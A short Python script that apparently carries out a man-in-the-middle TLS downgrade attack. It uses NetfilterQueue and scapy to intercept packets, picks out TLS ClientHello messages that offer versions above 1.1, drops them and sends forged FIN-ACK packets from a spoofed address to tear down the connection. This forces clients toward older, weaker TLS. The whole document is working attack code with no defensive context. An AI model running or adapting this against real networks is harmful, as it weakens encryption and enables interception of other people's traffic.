from netfilterqueue import NetfilterQueue
from scapy.all import *
from scapy.layers.inet import IP, TCP

def callback(pkt):
    raw = pkt.get_payload()
    ip = IP(raw)
    if (ip.haslayer('Raw')):
        p = ip['Raw'].load
        if p[0] == 0x16 and p[1] == 0x03 and p[5] == 0x01 and p[10] > 0x01:
            pkt.drop()
            pkt = IP(dst=ip['IP'].dst, src='172.16.0.3')/TCP()
            pkt['TCP'].sport = ip['TCP'].sport
            pkt['TCP'].dport = ip['TCP'].dport
            pkt['TCP'].seq = ip['TCP'].seq
            pkt['TCP'].ack = ip['TCP'].ack
            pkt['TCP'].flags = 'FA'
            send(pkt)
        else:
            pkt.accept()
    else:
        pkt.accept()

nfqueue = NetfilterQueue()
nfqueue.bind(0, callback, 100)
try:
    nfqueue.run()
except KeyboardInterrupt:
    print('')

nfqueue.unbind()
